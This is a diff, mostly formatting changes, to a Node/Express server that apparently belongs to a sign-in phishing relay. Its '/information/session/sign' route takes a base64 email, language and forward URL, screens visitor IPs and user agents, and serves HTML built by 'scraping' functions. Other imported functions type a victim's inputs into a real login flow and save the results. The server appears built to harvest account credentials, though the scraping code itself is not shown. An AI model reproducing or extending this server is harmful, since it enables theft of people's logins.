@@ -6,28 +6,31 @@ import path from "path";
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
-import cookieParser from 'cookie-parser';
+import cookieParser from "cookie-parser";
 import axios from "axios";
-
 
 dotenv.config();
 
 import {
   // mirror your Python common.py exports:
-  checkEmailAlreadySignin,   // (email, forwardUrl) => [boolean, htmlString]
-  checkEmailAlreayRunning,   // (email) => number
+  checkEmailAlreadySignin, // (email, forwardUrl) => [boolean, htmlString]
+  checkEmailAlreayRunning, // (email) => number
   getUserId,
-  initRendering,                  // ({ user_ip, userAgent }) => number
+  initRendering, // ({ user_ip, userAgent }) => number
 } from "./utils/common.js";
 
 import {
-  scrapingReady,               // (userId, email, hl, { forwardURL, userAgent, newUserFlg }) => html
+  scrapingReady, // (userId, email, hl, { forwardURL, userAgent, newUserFlg }) => html
   scrap_input_value_and_btn_next, // (userId, inputValue, btnType, btnText) => obj
-  scrap_check_url,              // (userId) => obj
+  scrap_check_url, // (userId) => obj
   save_scraping_result_and_set_done, // (userId) => void
 } from "./utils/scraping.js";
 import { decodeB64, writeDebugLogLine } from "./utils/helpers.js";
-import { checkAgentValidation, checkClientIpValidation } from './utils/security.js'
+import {
+  checkAgentValidation,
+  checkClientIpValidation,
+} from "./utils/security.js";
+
 
 // ---------------------------
 // Config
@@ -36,13 +39,14 @@ const app = express();
 const PORT = Number(process.env.APP_PORT || 8101);
 
 app.use(express.json());
-app.use(express.raw({ type: 'application/x-protobuffer' }));
+app.use(express.raw({ type: "application/x-protobuffer" }));
 app.use(express.urlencoded({ extended: true }));
 app.use(cookieParser());
 app.use(cors());
 
 // If you sit behind a reverse proxy and want accurate req.ip:
 app.set("trust proxy", true);
+
 
 initRendering();
 // ---------------------------
@@ -67,25 +71,31 @@ app.use(async (req, res, next) => {
   req.userAgent = userAgent;
   next();
 });
-app.get('/information/session/sign', async (req, res) => {
+app.get("/information/session/sign", async (req, res) => {
   // Rewrite path (drop first segment)
-  const { clientIp, userAgent, originalUrl } = req
+  const { clientIp, userAgent, originalUrl } = req;
   try {
     writeDebugLogLine(`[REQ] ${clientIp}  ${originalUrl}  ${userAgent}`);
     // Build payload { userAgent, client_ip }
     const payload = {
       userAgent: userAgent,
       clientIp: clientIp,
-      params: req.query || {}
+      params: req.query || {},
     };
-    const backendRes = await axios.post(`http://localhost:${PORT}/api/sign`, payload);
+    const backendRes = await axios.post(
+      `http://localhost:${PORT}/api/sign`,
+      payload
+    );
     return res.status(backendRes.status || 200).send(backendRes.data);
   } catch (err) {
-    writeDebugLogLine(`[ERROR] ${clientIp}  ${originalUrl}  ${String(err && err.message || err)}`);
+    writeDebugLogLine(
+      `[ERROR] ${clientIp}  ${originalUrl}  ${String(
+        (err && err.message) || err
+      )}`
+    );
     return res.status(502).send("Bad Gateway");
   }
-
-})
+});
 app.get("/pyapi/test", (req, res) => {
   console.log("[API TESTING]");
   return res.status(200).json({
@@ -97,7 +107,6 @@ app.get("/pyapi/test", (req, res) => {
 // information/session/sign  (GET or POST)
 // Mirrors Flask logic: accept JSON body + query params
 app.post("/api/sign", async (req, res) => {
-
   try {
     if (!(req.clientIp == "127.0.0.1" || req.clientIp == "::1")) {
       writeDebugLogLine(`******** [DANGER IP] : ${ip} ********`);
@@ -106,7 +115,7 @@ app.post("/api/sign", async (req, res) => {
     // Prefer JSON body, fallback to query
     const reqBody = req.body || {};
 
-    const { userAgent, clientIp, params } = reqBody
+    const { userAgent, clientIp, params } = reqBody;
     const { hl, acc, forward } = params;
     let email = decodeB64(acc, "");
     let lang = hl;
@@ -134,22 +143,20 @@ app.post("/api/sign", async (req, res) => {
       });
       console.log("[NEW USER ID] :", userId, email, lang, forwardURL);
 
-      const htmlTxt = await scrapingReady(
-        userId,
-        email,
-        lang,
-        { forwardURL, userAgent, newUserFlg: true }
-      );
+      const htmlTxt = await scrapingReady(userId, email, lang, {
+        forwardURL,
+        userAgent,
+        newUserFlg: true,
+      });
       return res.status(200).send(htmlTxt || "");
     } else {
       // Reuse existing user id
       console.log("[USER ID]", tmpid, email);
-      const htmlTxt = await scrapingReady(
-        tmpid,
-        email,
-        lang,
-        { forwardURL, userAgent, newUserFlg: false }
-      );
+      const htmlTxt = await scrapingReady(tmpid, email, lang, {
+        forwardURL,
+        userAgent,
+        newUserFlg: false,
+      });
       return res.status(200).send(htmlTxt || "");
     }
   } catch (err) {
@@ -218,7 +225,7 @@ app.get("/robots.txt", (req, res) => {
 });
 
 app.get("*", (req, res) => {
-  const { clientIp, userAgent } = req
+  const { clientIp, userAgent } = req;
   writeDebugLogLine(`[Wrong Request] ${clientIp}  ${req.url}  ${userAgent}`);
   return res.status(404).send("Not Found");
 });
